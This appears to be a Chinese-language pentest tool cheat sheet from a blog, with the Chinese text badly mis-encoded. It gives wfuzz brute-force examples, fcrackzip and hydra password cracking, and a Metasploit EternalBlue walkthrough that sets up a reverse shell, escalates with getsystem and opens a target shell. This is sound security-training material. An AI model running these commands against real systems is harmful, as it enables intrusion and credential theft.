<li><strong>æ¼æ´æ£€æµ‹</strong>ï¼šæ£€æµ‹ SQL æ³¨å…¥ã€XSSã€å‘½ä»¤æ³¨å…¥ç­‰å®‰å…¨æ¼æ´ã€‚</li>
<li><strong>HTTP è¯·æ±‚è‡ªå®šä¹‰</strong>ï¼šå…è®¸ç”¨æˆ·çµæ´»è‡ªå®šä¹‰ HTTP è¯·æ±‚ï¼Œå®ç°é«˜çº§æ¨¡ç³Šæµ‹è¯•ã€‚<br><strong><code>-u/--url</code></strong>   æŒ‡å®šç›®æ ‡ URLï¼Œå¹¶åœ¨å…¶ä¸­æ’å…¥ <code>FUZZ</code> å ä½ç¬¦ï¼ŒWFuzz ä¼šç”¨å­—å…¸å†…å®¹æ›¿æ¢ <code>FUZZ</code> è¿›è¡Œè¯·æ±‚ã€‚<br><code>wfuzz -u http://example.com/FUZZ</code><br>é»˜è®¤è‡ªå¸¦å‘¢ä½ç½®åœ¨<code>/usr/share/wfuzz/wordlist  </code><br>å‚æ•°æšä¸¾çš„å­—å…¸ç”¨<code>/usr/share/seclists/Discovery/Web-Content/common.txt</code></li>
</ol>
<h3 id="å¸¸è§çš„-z-é€‰é¡¹ï¼š"><a href="#å¸¸è§çš„-z-é€‰é¡¹ï¼š" class="headerlink" title="å¸¸è§çš„ -z é€‰é¡¹ï¼š"></a>å¸¸è§çš„ <code>-z</code> é€‰é¡¹ï¼š</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>file,æ–‡ä»¶è·¯å¾„</code></td>
<td>ä»å­—å…¸æ–‡ä»¶åŠ è½½æ•°æ®</td>
</tr>
<tr>
<td><code>range,1-100</code></td>
<td>ç”Ÿæˆ 1 åˆ° 100 çš„æ•°å­—è¿›è¡Œæµ‹è¯•</td>
</tr>
<tr>
<td><code>hex,4</code></td>
<td>ç”Ÿæˆ 4 ä½çš„åå…­è¿›åˆ¶æ•°</td>
</tr>
<tr>
<td><code>alphanum,6</code></td>
<td>ç”Ÿæˆ 6 ä½çš„å­—æ¯ + æ•°å­—å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>random,10</code></td>
<td>ç”Ÿæˆ 10 ä½éšæœºå­—ç¬¦</td>
</tr>
</tbody></table>
<h3 id="è¿‡æ»¤æ— æ•ˆå“åº”"><a href="#è¿‡æ»¤æ— æ•ˆå“åº”" class="headerlink" title="è¿‡æ»¤æ— æ•ˆå“åº”"></a><strong>è¿‡æ»¤æ— æ•ˆå“åº”</strong></h3><p><code>WFuzz</code> å¯èƒ½ä¼šè¿”å›å¤§é‡æ— æ•ˆçš„ 404 å“åº”ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼š</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>--hc 404</code></td>
<td>éšè— HTTP çŠ¶æ€ç ä¸º 404 çš„å“åº”</td>
</tr>
<tr>
<td><code>--hl 10</code></td>
<td>éšè—è¡Œæ•°ç­‰äº 10 çš„å“åº”</td>
</tr>
<tr>
<td><code>--hw 5</code></td>
<td>éšè—å•è¯æ•°ç­‰äº 5 çš„å“åº”</td>
</tr>
<tr>
<td><code>--hh 200</code></td>
<td>éšè—å­—èŠ‚æ•°ç­‰äº 200 çš„å“åº”</td>
</tr>
<tr>
<td>ï¼ˆçœ‹è¿‡çš„ä¸€ä¸ªç”¨æ³•æ˜¯ â€“hc 404 â€“hl 3 â€“hw 1</td>
<td></td>
</tr>
<tr>
<td><code>-d</code> å¯ä»¥åŒæ—¶å¤šä¸ªFUZZä½ç½®</td>
<td></td>
</tr>
</tbody></table>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,users.txt -z file,passwords.txt -d <span class="string">&quot;username=FUZZ&amp;password=FUZ2Z&quot;</span> <span class="string">&#x27;http://example.com/login&#x27;</span></span><br><span class="line"><span class="comment">#å¸¦ä¸Šcookie</span></span><br><span class="line">wfuzz -w <span class="regexp">/usr/</span>share<span class="regexp">/seclists/</span>Discovery<span class="regexp">/Web-Content/</span>common.txt -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">240.230</span>/history.php?FUZZ=kakeru -H <span class="string">&#x27;Cookie: PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&#x27;</span> --hh <span class="number">0</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line">é€‰é¡¹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="deletion">-h/--helpï¼šå¸®åŠ©</span></span><br><span class="line"><span class="deletion">--helpï¼šé«˜çº§å¸®åŠ©</span></span><br><span class="line"><span class="deletion">--filter-helpï¼šç­›é€‰å™¨å¸®åŠ©</span></span><br><span class="line"><span class="deletion">--versionï¼šWfuzzç‰ˆæœ¬è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line"><span class="deletion">-eï¼œtypeï¼ï¼šå¯ç”¨ç¼–ç å™¨/æœ‰æ•ˆè´Ÿè½½/è¿­ä»£å™¨/æ‰“å°æœº/è„šæœ¬åˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">--recipeï¼œfilenameï¼ï¼šä»é…æ–¹ä¸­è¯»å–é€‰é¡¹ã€‚å¯¹å„ç§é£Ÿè°±é‡å¤ä¸Šè¿°æ­¥éª¤ã€‚</span></span><br><span class="line"><span class="deletion">--dump recipeï¼œfilenameï¼ï¼šå°†å½“å‰é€‰é¡¹æ‰“å°ä¸ºé…æ–¹</span></span><br><span class="line"><span class="deletion">--oFï¼œfilenameï¼ï¼šå°†æ¨¡ç³Šç»“æœä¿å­˜åˆ°æ–‡ä»¶ä¸­ã€‚è¿™äº›å¯ä»¥ç¨åä½¿ç”¨wfuzzæœ‰æ•ˆè´Ÿè½½æ¥ä½¿ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-cï¼šå¸¦é¢œè‰²çš„è¾“å‡º</span></span><br><span class="line"><span class="deletion">-vï¼šè¯¦ç»†ä¿¡æ¯ã€‚</span></span><br><span class="line"><span class="deletion">-f filenameï¼Œprinterï¼šä½¿ç”¨æŒ‡å®šçš„æ‰“å°æœºï¼ˆå¦‚æœçœç•¥äº†åŸå§‹æ‰“å°æœºï¼‰å°†ç»“æœå­˜å‚¨åœ¨è¾“å‡ºæ–‡ä»¶ä¸­ã€‚</span></span><br><span class="line"><span class="deletion">-o printerï¼šä½¿ç”¨æŒ‡å®šçš„æ‰“å°æœºæ˜¾ç¤ºç»“æœã€‚</span></span><br><span class="line"><span class="deletion">--interact:ï¼ˆbetaï¼‰å¦‚æœé€‰ä¸­ï¼Œåˆ™æ•è·æ‰€æœ‰æŒ‰é”®ã€‚è¿™å…è®¸æ‚¨ä¸ç¨‹åºäº¤äº’ã€‚</span></span><br><span class="line"><span class="deletion">--dry-runï¼šæ‰“å°åº”ç”¨è¯·æ±‚çš„ç»“æœï¼Œè€Œä¸å®é™…å‘å‡ºä»»ä½•HTTPè¯·æ±‚ã€‚</span></span><br><span class="line"><span class="deletion">--prevï¼šæ‰“å°ä»¥å‰çš„HTTPè¯·æ±‚ï¼ˆä»…å½“ä½¿ç”¨ç”Ÿæˆæ¨¡ç³Šç»“æœçš„æœ‰æ•ˆè´Ÿè½½æ—¶ï¼‰</span></span><br><span class="line"><span class="deletion">--efieldï¼œexprï¼ï¼šæ˜¾ç¤ºæŒ‡å®šçš„è¯­è¨€è¡¨è¾¾å¼ä»¥åŠå½“å‰è´Ÿè½½ã€‚å¯¹å„ä¸ªå­—æ®µé‡å¤ä¸Šè¿°æ“ä½œã€‚</span></span><br><span class="line"><span class="deletion">--fieldï¼œexprï¼ï¼šä¸æ˜¾ç¤ºæœ‰æ•ˆè´Ÿè½½ï¼Œåªæ˜¾ç¤ºæŒ‡å®šçš„è¯­è¨€è¡¨è¾¾å¼ã€‚å¯¹å„ä¸ªå­—æ®µé‡å¤ä¸Šè¿°æ“ä½œã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-p addrï¼šä½¿ç”¨ip:port:typeæ ¼å¼çš„ä»£ç†ã€‚é‡å¤ä½¿ç”¨å„ç§ä»£ç†çš„é€‰é¡¹ã€‚å¦‚æœçœç•¥ï¼Œç±»å‹å¯ä»¥æ˜¯SOCKS4ã€SOCKS5æˆ–HTTPã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-t Nï¼šæŒ‡å®šå¹¶å‘è¿æ¥æ•°ï¼ˆé»˜è®¤å€¼ä¸º10ï¼‰</span></span><br><span class="line"><span class="deletion">-s Nï¼šæŒ‡å®šè¯·æ±‚ä¹‹é—´çš„æ—¶é—´å»¶è¿Ÿï¼ˆé»˜è®¤å€¼ä¸º0ï¼‰</span></span><br><span class="line"><span class="deletion">-R depthï¼šé€’å½’è·¯å¾„å‘ç°æ·±åº¦æ˜¯æœ€å¤§é€’å½’çº§åˆ«ã€‚</span></span><br><span class="line"><span class="deletion">-D depthï¼šæœ€å¤§é“¾æ¥æ·±åº¦çº§åˆ«ã€‚</span></span><br><span class="line"><span class="deletion">-L, --follow:éµå¾ªHTTPé‡å®šå‘</span></span><br><span class="line"><span class="deletion">--ip-host:portï¼šä»¥ip:portæ ¼å¼æŒ‡å®šè¦è¿æ¥çš„ipï¼Œè€Œä¸æ˜¯URLçš„ä¸»æœº</span></span><br><span class="line"><span class="deletion">-Zï¼šæ‰«ææ¨¡å¼ï¼ˆå°†å¿½ç•¥è¿æ¥é”™è¯¯ï¼‰ã€‚</span></span><br><span class="line"><span class="deletion">--req delay Nï¼šè®¾ç½®è¯·æ±‚å…è®¸çš„æœ€é•¿æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼ˆCURLOPT_TIMEOUTï¼‰ã€‚é»˜è®¤å€¼90ã€‚</span></span><br><span class="line"><span class="deletion">--conn-delay Nï¼šè®¾ç½®æœåŠ¡å™¨è¿æ¥é˜¶æ®µè¦èŠ±è´¹çš„æœ€é•¿æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼ˆCURLOPT_CONNECTTIMEOUTï¼‰ã€‚é»˜è®¤å€¼90ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-A, --AA, --AAA: --script=defaultï¼Œverboseï¼Œdiscovery-v-cçš„åˆ«å</span></span><br><span class="line"><span class="deletion">--no-cacheï¼šç¦ç”¨æ’ä»¶ç¼“å­˜ã€‚å°†æ‰«ææ¯ä¸ªè¯·æ±‚ã€‚</span></span><br><span class="line"><span class="deletion">--script=ï¼šç›¸å½“äº--script=é»˜è®¤å€¼</span></span><br><span class="line"><span class="deletion">--script=&lt;plugins&gt;ï¼šè¿è¡Œè„šæœ¬çš„æ‰«æ&lt;plugins&gt;æ˜¯ä»¥é€—å·åˆ†éš”çš„æ’ä»¶æ–‡ä»¶æˆ–æ’ä»¶ç±»åˆ«åˆ—è¡¨</span></span><br><span class="line"><span class="deletion">--script help=&lt;plugins&gt;ï¼šæ˜¾ç¤ºæœ‰å…³è„šæœ¬çš„å¸®åŠ©ã€‚</span></span><br><span class="line"><span class="deletion">--script-args n1=v1ï¼Œâ€¦ï¼šä¸ºè„šæœ¬æä¾›å‚æ•°ã€‚å³--script args grep.regex=â€œ&lt;A href=\â€ï¼ˆ.*ï¼Ÿï¼‰\â€œ&gt;â€</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-u urlï¼šæŒ‡å®šè¯·æ±‚çš„urlã€‚</span></span><br><span class="line"><span class="deletion">-m iteratorï¼šæŒ‡å®šç”¨äºç»„åˆæœ‰æ•ˆè½½è·çš„è¿­ä»£å™¨ï¼ˆé»˜è®¤ä¸ºproductï¼‰</span></span><br><span class="line"><span class="deletion">-z payloadï¼šä»¥åç§°[ï¼Œå‚æ•°][ï¼Œç¼–ç å™¨]çš„å½¢å¼ä¸ºæ¯ä¸ªFUZZå…³é”®å­—æŒ‡å®šæœ‰æ•ˆè´Ÿè½½ã€‚å¯ä»¥ä½¿ç”¨ç¼–ç å™¨åˆ—è¡¨ï¼Œå³md5-sha1ã€‚ç¼–ç å™¨å¯ä»¥æ˜¯é“¾å¼çš„ï¼Œå³ã€‚md5@sha1.å¯ä»¥ä½¿ç”¨ç¼–ç å™¨ç±»åˆ«ã€‚å³url</span></span><br><span class="line">ä½¿ç”¨å¸®åŠ©ä½œä¸ºæœ‰æ•ˆè´Ÿè½½æ¥æ˜¾ç¤ºæœ‰æ•ˆè´Ÿè½½æ’ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼ˆæ‚¨å¯ä»¥ä½¿ç”¨--sliceè¿›è¡Œè¿‡æ»¤ï¼‰</span><br><span class="line"></span><br><span class="line"><span class="deletion">--zPï¼œparamsï¼ï¼šæŒ‡å®šæœ‰æ•ˆè´Ÿè½½çš„å‚æ•°ï¼ˆå¿…é¡»ä»¥-zæˆ–-wå¼€å¤´ï¼‰ã€‚</span></span><br><span class="line"><span class="deletion">--zD&lt;default&gt;ï¼šæŒ‡å®šæœ‰æ•ˆè´Ÿè½½çš„é»˜è®¤å‚æ•°ï¼ˆå¿…é¡»ä»¥-zæˆ–-wå¼€å¤´ï¼‰ã€‚</span></span><br><span class="line"><span class="deletion">--zEï¼œencoderï¼ï¼šæŒ‡å®šæœ‰æ•ˆè´Ÿè½½çš„ç¼–ç å™¨ï¼ˆå®ƒå¿…é¡»ä»¥-zæˆ–-wå¼€å¤´ï¼‰ã€‚</span></span><br><span class="line"><span class="deletion">--sliceï¼œfilterï¼ï¼šä½¿ç”¨æŒ‡å®šçš„è¡¨è¾¾å¼è¿‡æ»¤æœ‰æ•ˆè´Ÿè½½çš„å…ƒç´ ã€‚å®ƒå¿…é¡»ä»¥-zå¼€å¤´ã€‚</span></span><br><span class="line"><span class="deletion">-w wordlistï¼šæŒ‡å®šwordlistæ–‡ä»¶ï¼ˆ-zæ–‡ä»¶çš„åˆ«åï¼Œwordlistï¼‰ã€‚</span></span><br><span class="line"><span class="deletion">-V alltypeï¼šæ‰€æœ‰å‚æ•°brutformingï¼ˆallvarså’Œallpostï¼‰ã€‚ä¸éœ€è¦FUZZå…³é”®å­—ã€‚</span></span><br><span class="line"><span class="deletion">-X methodï¼šæŒ‡å®šè¯·æ±‚çš„HTTPæ–¹æ³•ï¼Œå³HEADæˆ–FUZZ</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-b cookieï¼šä¸ºè¯·æ±‚æŒ‡å®šcookieã€‚å¯¹å„ç§cookieé‡å¤é€‰é¡¹ã€‚</span></span><br><span class="line"><span class="deletion">-d postdataï¼šä½¿ç”¨postdataï¼ˆä¾‹å¦‚ï¼šâ€œid=FUZZ&amp;catalog=1â€ï¼‰</span></span><br><span class="line"><span class="deletion">-H headerï¼šä½¿ç”¨headerï¼ˆä¾‹å¦‚ï¼šâ€œCookie:id=1312321&amp;user=FUZZâ€ï¼‰ã€‚å¯¹å„ç§æ ‡é¢˜é‡å¤é€‰é¡¹ã€‚</span></span><br><span class="line"><span class="deletion">--basic/ntlm/digest authï¼šæ ¼å¼ä¸ºâ€œuser:passâ€æˆ–â€œFUZZ:FUZZâ€æˆ–</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">--hc/hl/hw/hh N[ï¼ŒN]+ï¼šéšè—å…·æœ‰æŒ‡å®šä»£ç /è¡Œ/å­—/å­—ç¬¦çš„å“åº”ï¼ˆä½¿ç”¨BBBä»åŸºçº¿è·å–å€¼ï¼‰</span></span><br><span class="line"><span class="deletion">--sc/sl/sw/sh N[ï¼ŒN]+ï¼šæ˜¾ç¤ºå…·æœ‰æŒ‡å®šä»£ç /è¡Œ/å­—/å­—ç¬¦çš„å“åº”ï¼ˆä½¿ç”¨BBBè·å–åŸºçº¿å€¼ï¼‰</span></span><br><span class="line"><span class="deletion">--ss/hsæ­£åˆ™è¡¨è¾¾å¼ï¼šæ˜¾ç¤º/éšè—å†…å®¹ä¸­å…·æœ‰æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„å“åº”</span></span><br><span class="line"><span class="deletion">--filterï¼œfilterï¼ï¼šä½¿ç”¨æŒ‡å®šçš„ç­›é€‰å™¨è¡¨è¾¾å¼æ˜¾ç¤º/éšè—å“åº”ï¼ˆä½¿ç”¨BBBä»åŸºçº¿è·å–å€¼ï¼‰</span></span><br><span class="line"><span class="deletion">--prefilterï¼œfilterï¼ï¼šä½¿ç”¨æŒ‡å®šçš„è¡¨è¾¾å¼åœ¨æ¨¡ç³ŠåŒ–ä¹‹å‰è¿‡æ»¤é¡¹ç›®ã€‚å¯¹ä¸²è”è¿‡æ»¤å™¨é‡å¤ä¸Šè¿°æ­¥éª¤ã€‚</span></span><br></pre></td></tr></table></figure></div>

<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>Binwalk æ˜¯ä¸€ä¸ªç”¨äºåˆ†ææ–‡ä»¶çš„å·¥å…·ï¼Œå¸¸ç”¨äºéšå†™åˆ†æã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">binwalk -e &lt;æ–‡ä»¶&gt; <span class="attribute">--run-as</span>=root</span><br></pre></td></tr></table></figure></div>

<h2 id="Dos2Unix"><a href="#Dos2Unix" class="headerlink" title="Dos2Unix"></a>Dos2Unix</h2><p>ç”¨äºå°† Windows æ–‡æœ¬æ–‡ä»¶è½¬æ¢ä¸º Unix æ ¼å¼ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">dos2unix <span class="tag">&lt;<span class="name">æ–‡ä»¶</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="SearchSploit"><a href="#SearchSploit" class="headerlink" title="SearchSploit"></a>SearchSploit</h2><p>SearchSploit ç”¨äºæœç´¢ Exploit-DB æ¼æ´åˆ©ç”¨ä»£ç ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">searchsploit <span class="tag">&lt;<span class="name">æ¼æ´æˆ–è½¯ä»¶å</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æ¼æ´åˆ©ç”¨æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits</span><br></pre></td></tr></table></figure></div>

<h2 id="Metasploit-msfconsole"><a href="#Metasploit-msfconsole" class="headerlink" title="Metasploit (msfconsole)"></a>Metasploit (msfconsole)</h2><p><code>msfconsole</code> æ˜¯ <strong>Metasploit Framework</strong> çš„å‘½ä»¤è¡Œç•Œé¢ï¼ŒMetasploit æ˜¯ä¸€ä¸ªç”¨äºå¼€å‘å’Œæ‰§è¡Œæ¼æ´åˆ©ç”¨ä»£ç çš„å¼€æºå·¥å…·ã€‚å®ƒå¹¿æ³›ç”¨äºæ¸—é€æµ‹è¯•ã€å®‰å…¨è¯„ä¼°ä»¥åŠæ¼æ´åˆ†æã€‚<code>msfconsole</code> æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„å‘½ä»¤è¡Œç¯å¢ƒï¼Œå…è®¸ç”¨æˆ·å¿«é€Ÿè®¿é—®å„ç§å®‰å…¨æµ‹è¯•åŠŸèƒ½ã€‚<br>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å‘½ä»¤åŠå…¶è¯´æ˜ï¼š</p>
<h3 id="å¸¸ç”¨å‚æ•°-4"><a href="#å¸¸ç”¨å‚æ•°-4" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>show</code></td>
<td>åˆ—å‡ºå¯ç”¨çš„ payloads&#x2F;exploitsã€‚</td>
</tr>
<tr>
<td><code>set &lt;é€‰é¡¹&gt;</code></td>
<td>è®¾ç½®æ”»å‡»å‚æ•°ã€‚</td>
</tr>
<tr>
<td><code>unset &lt;é€‰é¡¹&gt;</code></td>
<td>å–æ¶ˆé€‰é¡¹è®¾ç½®ã€‚</td>
</tr>
<tr>
<td><code>exploit</code></td>
<td>è¿è¡Œæ¼æ´åˆ©ç”¨ã€‚</td>
</tr>
<tr>
<td><code>sessions</code></td>
<td>ç®¡ç†ä¼šè¯ã€‚</td>
</tr>
<tr>
<td><code>info</code></td>
<td>æŸ¥çœ‹æ¨¡å—è¯¦ç»†ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>search &lt;åç§°&gt;</code></td>
<td>æœç´¢æ¼æ´ã€‚</td>
</tr>
<tr>
<td><code>use &lt;æ¨¡å—&gt;</code></td>
<td>é€‰æ‹©æ¼æ´æ¨¡å—ã€‚</td>
</tr>
<tr>
<td><code>db_nmap</code></td>
<td>è¿è¡Œ Nmap å¹¶ä¿å­˜ç»“æœã€‚</td>
</tr>
<tr>
<td><code>exit</code> æˆ– <code>quit</code></td>
<td>é€€å‡º Metasploitã€‚</td>
</tr>
</tbody></table>
<h3 id="ä½¿ç”¨ç¤ºä¾‹-2"><a href="#ä½¿ç”¨ç¤ºä¾‹-2" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. å¯åŠ¨ Metasploit</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æœç´¢æ¼æ´</span></span><br><span class="line">search smb</span><br><span class="line"><span class="comment"># è¯¥å‘½ä»¤æœç´¢ä¸ SMB ç›¸å…³çš„æ¼æ´åˆ©ç”¨æ¨¡å—</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. é€‰æ‹©æ¼æ´æ¨¡å—</span></span><br><span class="line">use exploit<span class="regexp">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># é€‰æ‹© EternalBlueï¼ˆMS17-010ï¼‰æ¼æ´åˆ©ç”¨æ¨¡å—</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. æŸ¥çœ‹æ¨¡å—è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">info</span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå½“å‰æ¨¡å—çš„è¯¦ç»†è¯´æ˜å’Œå¯ç”¨é€‰é¡¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. è®¾ç½®æ”»å‡»ç›®æ ‡</span></span><br><span class="line">set RHOSTS <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"><span class="comment"># ç›®æ ‡ IP åœ°å€</span></span><br><span class="line"></span><br><span class="line">set RPORT <span class="number">445</span></span><br><span class="line"><span class="comment"># é€‰æ‹©ç›®æ ‡ç«¯å£ 445ï¼ˆSMB ç«¯å£ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. è®¾ç½®æœ¬åœ°æ”»å‡»æœºçš„å›è¿ï¼ˆåå‘ shellï¼‰</span></span><br><span class="line">set LHOST <span class="number">192.168</span>.<span class="number">1.50</span></span><br><span class="line"><span class="comment"># è®¾ç½®æ”»å‡»è€…çš„ LHOST</span></span><br><span class="line"></span><br><span class="line">set LPORT <span class="number">4444</span></span><br><span class="line"><span class="comment"># é€‰æ‹©æœ¬åœ°ç›‘å¬ç«¯å£ 4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. è¿è¡Œæ¼æ´åˆ©ç”¨</span></span><br><span class="line">exploit</span><br><span class="line"><span class="comment"># å¯åŠ¨æ¼æ´æ”»å‡»ï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™ä¼šè·å¾—ç›®æ ‡ä¸»æœºçš„ meterpreter shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. ç›‘å¬å’Œç®¡ç†ä¼šè¯</span></span><br><span class="line">sessions -l</span><br><span class="line"><span class="comment"># åˆ—å‡ºå½“å‰æ´»è·ƒçš„ä¼šè¯</span></span><br><span class="line"></span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line"><span class="comment"># è¿›å…¥ ID ä¸º 1 çš„ä¼šè¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. è·å–ç³»ç»Ÿæƒé™</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment"># å°è¯•æå‡æƒé™åˆ° SYSTEM çº§åˆ«</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. è·å–ç›®æ ‡ç³»ç»Ÿä¿¡æ¯</span></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. è·å–ç›®æ ‡ä¸»æœºçš„ Shell</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># è¿›å…¥ç›®æ ‡ç³»ç»Ÿçš„å‘½ä»¤è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12. è¿è¡Œ Nmap å¹¶ä¿å­˜æ‰«æç»“æœ</span></span><br><span class="line">db_nmap -sV -p <span class="number">80</span>,<span class="number">443</span>,<span class="number">445</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line"><span class="comment"># æ‰«æ 192.168.1.0/24 ç½‘ç»œçš„ 80, 443, 445 ç«¯å£ï¼Œå¹¶ä¿å­˜ç»“æœåˆ°æ•°æ®åº“</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 13. é€€å‡º Metasploit</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"><span class="comment"># é€€å‡º msfconsole</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>use auxiliary/scanner/ssh/ssh_login</code></strong>ï¼š<ul>
<li><code>auxiliary</code>ï¼šMetasploit ä¸­çš„è¾…åŠ©æ¨¡å—ï¼ˆä¸ç›´æ¥è·å– shellï¼Œè€Œæ˜¯ç”¨äºæ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç™»å½•å°è¯•ç­‰ï¼‰ã€‚</li>
<li><code>scanner/ssh/ssh_login</code>ï¼šç”¨äºå¯¹ç›®æ ‡ SSH æœåŠ¡å™¨è¿›è¡Œç”¨æˆ·å&#x2F;å¯†ç ç»„åˆçˆ†ç ´ã€‚</li>
</ul>
</li>
</ul>
<h2 id="Cewl"><a href="#Cewl" class="headerlink" title="Cewl"></a>Cewl</h2><p>Cewl æ˜¯ä¸€ä¸ªçˆ¬è™«å·¥å…·ï¼Œå¯ä»¥æŠ“å–ç½‘ç«™å†…å®¹å¹¶ç”Ÿæˆå¯†ç å­—å…¸ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">cewl -w <span class="tag">&lt;<span class="name">è¾“å‡ºæ–‡ä»¶</span>&gt;</span> -d <span class="tag">&lt;<span class="name">æ·±åº¦</span>&gt;</span> <span class="tag">&lt;<span class="name">URL</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><p>ä½¿ç”¨frackzipç ´è§£å‹ç¼©åŒ…</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fcrackzip</span> -b -c <span class="number">1</span> -l <span class="number">1</span>-<span class="number">6</span> -p <span class="number">0</span> -u <span class="number">1</span>.zip</span><br></pre></td></tr></table></figure></div>
<p>-bï¼šä½¿ç”¨æš´åŠ›ç ´è§£æ¨¡å¼ã€‚</p>
<p>-c 1ï¼šé™åˆ¶å¯†ç ä»…åŒ…å«æ•°å­—å­—ç¬¦ã€‚</p>
<p>-l 1-6ï¼šé™åˆ¶å¯†ç é•¿åº¦åœ¨ 1 åˆ° 6 ä¸ªå­—ç¬¦ä¹‹é—´ã€‚</p>
<p>-p 0ï¼šåˆå§‹åŒ–ç ´è§£èµ·ç‚¹ä¸º 0ã€‚</p>
<p>-uï¼šæ˜¾ç¤ºç ´è§£å‡ºæ¥çš„å¯†ç ã€‚</p>
<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>Hydra æ˜¯ä¸€ä¸ªå¤šåè®®æš´åŠ›ç ´è§£å·¥å…·ã€‚</p>
